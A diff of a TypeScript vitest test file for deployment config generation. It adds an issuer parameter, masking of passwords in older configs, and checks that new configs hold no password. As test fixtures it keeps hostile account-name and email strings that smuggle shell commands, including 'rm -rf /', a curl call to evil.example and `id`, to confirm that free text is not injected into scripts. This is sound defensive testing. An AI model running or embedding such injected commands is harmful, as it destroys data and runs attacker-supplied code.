@@ -1,11 +1,20 @@
 import { execFileSync } from "node:child_process";
 import { expect, test } from "vitest";
-import { configFileOf, mintConfig } from "./config.ts";
+import {
+  DeploymentConfig,
+  MASKED,
+  MaskedConfig,
+  configFileOf,
+  maskedConfigOf,
+  mintConfig,
+  signInOf,
+} from "./config.ts";
 import type { DeploymentRecord } from "./records.ts";
 import { runScriptOf } from "./runs.ts";
 
 // Free text a customer controls: Cloudflare's account name, and the address they sign in with.
 const hostileName = "Acme\nrm -rf / # $(curl evil.example) `id` '\"";
+const ISSUER = "https://os.example";
 const hostileEmail = "a+$(id)`x`@example.com";
 const record: DeploymentRecord = {
   id: "dep_aaaabbbbccccdddd",
@@ -42,7 +51,10 @@ test("a run's script holds no free text: not the account's name, not the owner's
 
 test("the config file holds the owner's address only as a JSON string, and the secrets core/os reads by path", () => {
   // mintConfig refuses such an address (z.email); the file must hold whatever it is given safely
-  const minted = mintConfig({ ...record, owner: { ...record.owner, email: "ada@example.test" } });
+  const minted = mintConfig(
+    { ...record, owner: { ...record.owner, email: "ada@example.test" } },
+    ISSUER,
+  );
   const config = { ...minted, login: { ...minted.login, allow: [{ email: hostileEmail }] } };
   const file = configFileOf(config, "/work/core/core/os");
   expect(file.split(JSON.stringify(hostileEmail)).join("")).not.toContain(hostileEmail);
@@ -57,13 +69,31 @@ test("the config file holds the owner's address only as a JSON string, and the s
   expect(JSON.parse(/const cloud = (\{[\s\S]*?\n\});/.exec(file)![1]!)).toEqual(config);
 });
 
+test("a deployment made before holds a password, which its config still parses and the browser's masks; a new one has nothing to mask", () => {
+  const minted = mintConfig(
+    { ...record, owner: { ...record.owner, email: "ada@example.test" } },
+    ISSUER,
+  );
+  const old = DeploymentConfig.parse({
+    ...minted,
+    login: { ...minted.login, methods: { password: { password: "a".repeat(20) } } },
+  });
+  expect(MaskedConfig.parse(maskedConfigOf(old))).toMatchObject({
+    login: { methods: { password: { password: MASKED } } },
+  });
+  expect(maskedConfigOf(minted)).toMatchObject({ login: minted.login });
+  expect([signInOf(minted), signInOf(old)]).toEqual(["iterate", "password"]);
+});
+
 test("a hostile address is refused at minting, and each config gets its own secrets", () => {
-  expect(() => mintConfig(record)).toThrow();
+  expect(() => mintConfig(record, ISSUER)).toThrow();
   const plain = { ...record, owner: { ...record.owner, email: "ada@example.test" } };
-  const [one, two] = [mintConfig(plain), mintConfig(plain)];
+  const [one, two] = [mintConfig(plain, ISSUER), mintConfig(plain, ISSUER)];
   expect(one.secretsEncryption.key).toMatch(/^[0-9a-f]{64}$/);
   expect(one).not.toMatchObject({ secretsEncryption: two.secretsEncryption });
-  expect(one).not.toMatchObject({ login: { methods: two.login.methods } });
+  // the owner signs in through the Cloud's platform alone, and the config holds no password
+  expect(one).toMatchObject({ login: { methods: { iterate: { issuer: ISSUER } } } });
+  expect(JSON.stringify(one)).not.toMatch(/password/);
   expect(one).toMatchObject({
     cloudflare: { accountId: record.accountId, resourcePrefix: "my-iterate", workersDev: true },
   });
